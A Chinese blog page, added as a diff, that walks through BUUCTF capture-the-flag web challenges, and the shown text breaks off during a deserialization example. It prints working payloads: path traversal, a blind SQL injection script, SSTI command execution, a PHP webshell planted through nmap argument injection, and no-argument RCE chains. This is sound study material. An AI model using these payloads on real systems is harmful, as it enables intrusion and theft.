@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>BUUCTF WriteUp | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Web,CTF," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>BUUCTF WriteUp</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-08-06
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/Web/">
+            Web
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passagesBUUCTF"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>记录一下从今天开始的刷题记录，主要是遇到的不懂不会的知识点。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>题目很简单，直接通过给的白名单绕过即可，网上题解很多，简单记录一下。</p>
+<pre><code class="php">&lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&amp;$page)
+        {
+            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+            if (! isset($page) || !is_string($page)) {
+                echo &quot;you can&#39;t see it&quot;;
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+    ) {
+        include $_REQUEST[&#39;file&#39;];
+        exit;
+    } else {
+        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+    }  
+?&gt;</code></pre>
+<p>payload:<code>?file=source.php?/../../../../ffffllllaaaagggg</code></p>
+<p>这里发现了一个php解析的点，错误的目录也可以在目录穿越的过程中使用，相当于如下目录</p>
+<p><code>/var/www/html/source.php?/</code>因此后边需要穿越四次。</p>
+<hr>
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>其实是很简单一道文件包含的题目，但是由于对Java-Web还是有些不熟悉所以记录一下。</p>
+<p>主页面有一个help，点开之后链接包含了这个文件</p>
+<p><code>http://e03beb09-975a-40f9-9144-4e774c692129.node3.buuoj.cn/Download?filename=help.docx</code></p>
+<p>但是回显却是<code>java.io.FileNotFoundException:{help.docx}</code>不是很明白出题人为什么要搞这一点，只提供了POST请求的下载</p>
+<p><img src="https://i.loli.net/2020/08/12/EAQjBxKPTlkpG5a.png" alt="image-20200812192033420"></p>
+<p>下载help.docx后发现</p>
+<p><img src="https://i.loli.net/2020/08/12/yA53qNQl2n7Emgh.png" alt="image-20200812192555929"></p>
+<p>自然要去别的地方找，关键点在这，记录一下</p>
+<pre><code>WEB-INF主要包含一下文件或目录:
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件</code></pre><p>下载<code>WEB-INF/web.xml</code>后得到FlagController源文件路径再下载打开后即得到flag。</p>
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><pre><code class="python">@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def getUrl():
+    url = request.args.get(&quot;url&quot;)
+    host = parse.urlparse(url).hostname
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 111&quot;
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 222 &quot; + host
+    newhost = []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] = &#39;.&#39;.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == &#39;suctf.cc&#39;:
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return &quot;我扌 your problem? 333&quot;</code></pre>
+<p><strong>nginx相关文件默认位置</strong></p>
+<pre><code>配置文件存放目录：/etc/nginx
+主配置文件：/etc/nginx/conf/nginx.conf
+管理脚本：/usr/lib64/systemd/system/nginx.service
+模块：/usr/lisb64/nginx/modules
+应用程序：/usr/sbin/nginx
+程序默认存放位置：/usr/share/nginx/html
+日志默认存放位置：/var/log/nginx
+配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><ul>
+<li>非预期1（只要是利用代码里的问题，前两个检查为host=空，但是后边处理的时候把空格删掉了）</li>
+</ul>
+<pre><code>?url=file:////suctf.cc/usr/fffffflag</code></pre><ul>
+<li><p>非预期2</p>
+<p>脚本</p>
+<pre><code class="python">from urllib.parse import urlparse,urlunsplit,urlsplit
+from urllib import parse
+def get_unicode():
+    for x in range(65536):
+        uni=chr(x)
+        url=&quot;http://suctf.c{}&quot;.format(uni)
+        try:
+            if getUrl(url):
+                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
+        except:
+            pass
+
+</code></pre>
+</li>
+</ul>
+<p>  def getUrl(url):<br>      url = url<br>      host = parse.urlparse(url).hostname<br>      if host == ‘suctf.cc’:<br>          return False<br>      parts = list(urlsplit(url))<br>      host = parts[1]<br>      if host == ‘suctf.cc’:<br>          return False<br>      newhost = []<br>      for h in host.split(‘.’):<br>          newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>      parts[1] = ‘.’.join(newhost)<br>      finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>      host = parse.urlparse(finalUrl).hostname<br>      if host == ‘suctf.cc’:<br>          return True<br>      else:<br>          return False</p>
+<p>  if <strong>name</strong>==”<strong>main</strong>“:<br>      get_unicode()</p>
+<pre><code>
+  类似的解有
+</code></pre><p>  file://suctf.cｃ/usr/fffffflag<br>  file://suctf.cℭ/usr/fffffflag</p>
+<pre><code>
+
+
+* 预期解
+</code></pre><p>file://1.1.1.1@suctf.c℆sr/fffffflag<br>file://suctf.c℆sr%2ffffffflag @111</p>
+<pre><code>
+[参考]: https://www.cnblogs.com/wangtanzhi/p/12181032.html
+
+
+
+## SQL注入
+
+### Day2 Web1]Hack World
+
+过滤了很多东西，如`空格、/**/、and、or、||、&amp;&amp;、ord`等
+
+但是直接告诉了flag在flag中
+
+通过这个[参考链接](https://www.anquanke.com/post/id/205376#h3-19)可知
+
+![image-20200810171636080](https://i.loli.net/2020/08/10/fBc4qxLsvXhY2un.png)
+
+可以通过`1^1=0,1^0=1`的方法实现bool注入，最终脚本如下
+
+```python
+import requests
+import time
+import os
+url = &#39;http://d6c542d7-50d8-473e-b494-1ca2bfc8c09c.node3.buuoj.cn/&#39;
+dic = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-@&#39;
+flag = &#39;&#39;
+glzjin=&quot;Hello, glzjin wants a girlfriend.&quot;
+for i in xrange(1,50):
+    if &#39;}&#39; in flag :
+        os._exit(0)
+    for x in dic: 
+        data = {&#39;id&#39; : &#39;1^(if((ascii(substr((select(flag)from(flag)),&#39;+str(i)+&#39;,1))=&#39;+str(ord(x))+&#39;),0,1))&#39;}
+        res = requests.post(url,data)
+        time.sleep(0.1)
+        if glzjin  in res.text:    
+            flag+=x
+            print flag
+             break
+#flag{71124b3a-223d-45b6-aec9-86870894cfa5}
+#开始由于dic里没有加 &#39;-&#39; 一直错的/(ㄒoㄒ)/~~</code></pre><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>一打开怎么感觉做过，没错，和强网杯随便注几乎一样，但是随便住通过set拼接了select语句，然后用prepare预编译。大概如此。但是都被过滤了，因此只能找别方法了。</p>
+<pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>先试了一下报错得到了数据库名<code>supersqli</code>但是好像不能继续了，尝试随便注的堆叠，试了一下<code>show databases;</code> <code>show tables;</code> 然后发现flag应该在FlagHere表里了。继续查一下列，但是我就不知道接下来怎么做了</p>
+<p><img src="https://i.loli.net/2020/08/14/q39hSr5GMJwzbaC.png" alt="image-20200814124803828"></p>
+<p>最后找到了一个只在MySQL中存在的语句handler</p>
+<p>参考<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">官方文档</a></p>
+<pre><code>?inject=0&#39;; handler FlagHere open;handler FlagHere read first;-- 1</code></pre><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>原谅菜鸡的我第一次做这类题目，之前有见到过但是没敢去做，以后没什么敢不敢了，就是肝💪。</p>
+<p>参考大师傅们的介绍，而且因为这个题目没有任何过滤的样子，最终自己找到了一个payload</p>
+<p><img src="https://i.loli.net/2020/08/12/SqLUYsHxmwCQe4f.png" alt="image-20200812152758837"></p>
+<pre><code class="python">{{().__class__.__bases__[0].__subclasses__()[168].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
+
+{{[].__class__.__base__.__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
+
+#hackbar
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}</code></pre>
+<p>之后再慢慢消化这类知识</p>
+<h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>算是一道写脚本的题目吧。源码给了3001个php</p>
+<p>文件，但是能用的webshell应该只有一个参数。参考加修改后的最终脚本如下</p>
+<pre><code class="python">import os
+import re
+import requests
+import threading
+
+filePath = &#39;D://phpstudy_pro//WWW//src&#39;
+files = os.listdir(filePath)
+url = &quot;http://localhost/src/&quot;
+aaa = 0
+def get_rep(filename, name):
+    if(aaa==1):
+        global aaa
+        os._exit()
+    r_url = url + filename +  &quot;?&quot; + name + &quot;=echo flag;&quot;
+    rep = requests.get(r_url)
+    print(r_url)
+    if &#39;flag&#39; in rep.content.decode(&#39;utf-8&#39;):
+        print(&quot;Got It!   !!!!!!! &quot; + filename + &quot; The param is: _GET[&quot; + name +&quot;]&quot;)
+        aaa+=1
+        os._exit()
+
+def post_rep(filename, name):
+    if(aaa==1):
+        global aaa
+        os._exit()
+    r_url = url + filename
+    param = {
+        name: &quot;echo flag;&quot;
+    }
+    rep = requests.post(r_url, data=param)
+    print(r_url + &quot; POST: &quot; + name)
+    if &#39;flag&#39; in rep.content.decode(&#39;utf-8&#39;):
+        print(&quot;Got It!   !!!!!!! &quot; + filename + &quot; The param is: _POST[&quot; + name +&quot;]&quot;)
+        aaa+=1
+        os._exit()
+
+def runing(a,b):
+    a=int(a)
+    b=int(b)
+    for j in xrange(a,b):
+        print(str(1.0-(b-j)/120.0)+&quot;%&quot;)
+        k = files[j]
+        if k == &#39;.DS_Store&#39;:
+            continue
+        if k == &#39;index.html&#39;:
+            continue
+        with open(&#39;./src/&#39; + k, &#39;rt&#39;) as f:
+            content = f.read()
+            get = re.findall(r&quot;GET\[&#39;(.+?)&#39;\]&quot;, content)
+            post = re.findall(r&quot;POST\[&#39;(.+?)&#39;\]&quot;, content)
+            for i in get:
+                get_rep(k, i)
+            for i in post:
+                post_rep(k, i)
+            f.close()
+
+class myThread (threading.Thread):
+    def __init__(self, threadID, name, counter):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.counter = counter
+    def run(self):               
+        runing(self.name,self.counter)
+#0~3000 
+for i in range(0,24):
+    thread = myThread(i,i*120+1,(i+1)*120)
+    print i*120+1 
+    thread.start()</code></pre>
+<p>学习一下利用多线程和正则读文件，但是25线程也跑了半小时</p>
+<h2 id="RCE-remote-code-execution"><a href="#RCE-remote-code-execution" class="headerlink" title="RCE(remote code execution)"></a>RCE(remote code execution)</h2><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>题目源码如下</p>
+<pre><code class="php">&lt;?php
+if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
+    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+}
+
+if(!isset($_GET[&#39;host&#39;])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET[&#39;host&#39;];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
+    echo &#39;you are in sandbox &#39;.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+}</code></pre>
+<p>这个题目的点很简单，就在<code>escapeshellarg</code>和<code>escapeshellcmd</code>这两个函数的这个顺序的连用上出了问题，先总结一下两个函数的作用：</p>
+<p><img src="https://i.loli.net/2020/08/13/8QPnJIq2rTExeFD.png" alt="img"></p>
+<p><img src="https://i.loli.net/2020/08/13/m3U7XFfCv6Di1ja.png" alt="1564053418402"></p>
+<p>由于第一个函数是转义单引号，方式是先用<code>\</code>把单引号转义了，再用一对单引号把它包起来，效果如下：</p>
+<pre><code class="php">php &gt; echo escapeshellarg(&quot;asda&#39;asdas&quot;);
+&#39;asda&#39;\&#39;&#39;asdas&#39;</code></pre>
+<p>两个连用则会</p>
+<pre><code class="php">php &gt; echo escapeshellcmd(escapeshellarg(&quot;asda&#39;asdas&quot;));
+&#39;asda&#39;\\&#39;&#39;asdas\&#39;</code></pre>
+<p>第二个会把没有配对的单引号进行转义，但同时也把第一个函数用作转义的<code>\</code>转义了。相当于可以如下这样逃逸出参数来：</p>
+<pre><code class="php">php &gt; echo escapeshellcmd(escapeshellarg(&quot;asda&#39; -o 1.php&quot;));
+&#39;asda&#39;\\&#39;&#39; -o 1.php\&#39;</code></pre>
+<p>而在执行命令的时候比如写入到文件中时是如下这样的( 当时一直想不明白，明明<code>escapeshellcmd</code>之后 写入shell的那部分字符串也会被转义啊，为什么到文件的时候<code>\</code>就不见了，最后才发现我傻逼了/(ㄒoㄒ)/~~ )</p>
+<pre><code class="shell">root@kali:~# echo &#39;asda&#39;\\&#39;&#39; -o 1.php\&#39;
+asda\ -o 1.php&#39;
+
+root@kali:~# echo &#39;&#39;\\&#39;&#39; \&lt;\?php eval\(\$_REQUEST\[&quot;1&quot;\]\)\; \?\&gt; -oG 1.php 1\&#39;
+\ &lt;?php eval($_REQUEST[1]); ?&gt; -oG 1.php 1&#39;</code></pre>
+<p>这样则相当于可以通过该命令已有的参数执行一些命令，甚至getshell。</p>
+<p>找了一下类似的命令还有<code>curl、sendmail、weget</code>等，参考链接如下：</p>
+<p>此题目找到了nmap里输出到指定文件的参数有</p>
+<ul>
+<li>标准输出<code>-oN &lt;filespec&gt;</code></li>
+<li>XML格式输出<code>-oX &lt;filespec&gt;</code></li>
+<li>脚本小子输出<code>-oS &lt;filespec&gt;</code></li>
+<li>Grep 输出<code>-oG &lt;filespec&gt;</code></li>
+<li>输出至所有格式 <code>-oA &lt;basename&gt;</code></li>
+</ul>
+<p>在本地尝试了-oN 、-oG都可以，本地版本是7.+，但是题目的php版本为5.+，-oN的报错会直接显示，因此使用-oG就可以了，大概区别就是-oG不会把报错信息输出到文件，-oN会输出进去。最终payload为</p>
+<pre><code class="php">?host=&#39; &lt;?php eval($_REQUEST[1]);?&gt; -oG 1.php 1</code></pre>
+<h3 id="GXYCTF2019-禁止套娃-无参数RCE"><a href="#GXYCTF2019-禁止套娃-无参数RCE" class="headerlink" title="[GXYCTF2019]禁止套娃(无参数RCE)"></a>[GXYCTF2019]禁止套娃(无参数RCE)</h3><p>说在前面，我是真的好气啊，这道题什么都没有，肯定只有源码泄露了，然后也确实扫到.git了，但是Windows下的GitHack不知道哪根筋出问题了。去搜题解别人却可以。离谱，然后在kali上又行，/(ㄒoㄒ)/~~。<img src="https://i.loli.net/2020/08/14/H5qIXzBafYClsgZ.png" alt="image-20200814195128803"></p>
+<p><img src="https://i.loli.net/2020/08/14/klv7aihP6pNZo3B.png" alt="image-20200814195407716"></p>
+<p>说正事，下边就开始审计源码了，但是问题又来了。第一个正则匹配挺好理解，过滤了一些伪协议，但第二个是什么意思啊，我在本地试了好久都匹配不成功，去搜也没搜到这种表达式（可能我太菜了吧），去搜题解才看明白</p>
+<p><code>(?R)?</code>中的<code>(?R)</code>是引用当前表达式，后边的<code>?</code>是递归调用</p>
+<p>这样子就可以匹配如<code>abc()</code>、<code>abc(cba())</code>但是<code>a(&#39;a&#39;)</code>之类的括号当中带参数的则不能匹配。参考飘零学长的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>，以及奇奇师傅的<a href="https://www.gem-love.com/ctf/530.html" target="_blank" rel="noopener">wp</a>。</p>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&#39;exp&#39;])){
+    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) {
+        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) {
+            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) {
+                @eval($_GET[&#39;exp&#39;]);
+            }
+            else{
+                die(&quot;还差一点哦！&quot;);
+            }
+        }
+        else{
+            die(&quot;再好好想想！&quot;);
+        }
+    }
+    else{
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    }
+}
+?&gt;</code></pre>
+<p>由于过滤太多几乎不可能getshell，那么如何利用<code>@eval($_GET[&#39;exp&#39;]);</code>读到flag呢，比如构造出类似于<code>show_source(&#39;flag.php&#39;)</code>的函数。</p>
+<p>首先<code>scandir()</code>可以扫描目录，但是需要加参数，至少是这样子</p>
+<p><code>scandir(&#39;.&#39;)</code>即当前目录。</p>
+<p><img src="https://i.loli.net/2020/08/14/HEujUTbmNBK6P2L.png" alt="image-20200814205404526"></p>
+<p>如何得到<code>&#39;.&#39;</code>呢，参考大佬们的思路主要有四个方法，</p>
+<p><strong>1、chr(46)</strong></p>
+<p>这个又可通过至少三种方法获得</p>
+<pre><code>chr(rand())
+chr(time())
+chr(current(localtime()))</code></pre><p>因为<code>chr()</code>函数以256为一个周期，即<code>chr(0)</code> <code>chr(256)</code> <code>chr(512)</code>以此类推 他们都是相等。</p>
+<p>而<code>time()</code>却很大的一个数，因此每256一个周期才能拿到46，而<code>localtime</code>返回数组的<code>Array[0]</code>就是当前时间的秒级值，0~59，因此更容易拿到46</p>
+<p><img src="https://i.loli.net/2020/08/15/lqPdGJVIpR5fX2E.png" alt="image-20200815102757348"></p>
+<p>参考W3School</p>
+<ul>
+<li><a href="https://www.w3school.com.cn/php/func_array_current.asp" target="_blank" rel="noopener">current()</a> - 返回数组中的当前元素的值</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_pos.asp" target="_blank" rel="noopener">pos()</a> - 返回数组中的当前元素的值，是current()的别名。</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<p><strong>2、pos(localeconv())</strong></p>
+<p>其中<code>localeconv()</code>的作用如下</p>
+<p><img src="https://i.loli.net/2020/08/15/l95k6vXJWRxejPz.png" alt="image-20200815103203672"></p>
+<p>因此这样就能得到<code>.</code>了。但是过滤了<code>et</code>所以只能用前两种</p>
+<pre><code class="php">php &gt; var_dump(pos(localeconv()));
+string(1) &quot;.&quot;
+php &gt; var_dump(current(localeconv()));
+string(1) &quot;.&quot;
+php &gt; var_dump(reset(localeconv()));
+PHP Notice:  Only variables should be passed by reference in php shell code on line 1
+string(1) &quot;.&quot;</code></pre>
+<p>当然其他几个函数也可以组合使用如<code>var_dump(next(each(localeconv())));</code></p>
+<p><strong>3、phpversion()</strong></p>
+<p><strong>4、crypt()</strong></p>
+<p>上边两种复杂一点就没去细看了。</p>
+<p>然后扫描目录发现flag.php的位置在倒数第二个</p>
+<p><img src="https://i.loli.net/2020/08/15/snAKH5raRLcYNWZ.png" alt="image-20200815104807030"></p>
+<p>要怎么读到呢，主要的还有三个办法，</p>
+<p><strong>1、array_reverse()</strong> </p>
+<p>废话不多说，看函数名字就知道什么意思了，直接读flag，用于读文件的可以用的还有<code>highlight_file()</code>，<code>show_source()</code>，<code>readfile()</code>。不过记得readfile()要打开源码才能看到，其他两个是高亮显示。</p>
+<pre><code class="php">var_dump(show_source(next(array_reverse(scandir(next(each(localeconv())))))));</code></pre>
+<p><strong>2、array_rand(array_flip())</strong></p>
+<p><code>array_flip()</code>函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
+<p><code>array_rand()</code> 函数返回数组中的随机键名</p>
+<p>这两个连用，就可以返回数组中随机键值，因为数组中只有5个值，多试几次即可。</p>
+<pre><code class="php">var_dump(show_source(array_rand(array_flip(scandir(next(each(localeconv())))))));</code></pre>
+<p><strong>3、session_id(session_start())</strong></p>
+<p>飘零学长的文章提到了，可以这样子添加session然后读取</p>
+<p><img src="https://i.loli.net/2020/08/15/FH6TZUtGwkx95SO.png" alt="image-20200815112840532"></p>
+<p>虽然不能getshell，但是读文件就行了，那就来试试吧，一步到位，舒畅哈哈。</p>
+<p><img src="https://i.loli.net/2020/08/15/iZBUnFzlMxpQDYs.png" alt="image-20200815113330100"></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="网鼎杯-2020-青龙组-AreUSerialize"><a href="#网鼎杯-2020-青龙组-AreUSerialize" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialize"></a>[网鼎杯 2020 青龙组]AreUSerialize</h3><pre><code class="php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    }
+
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+
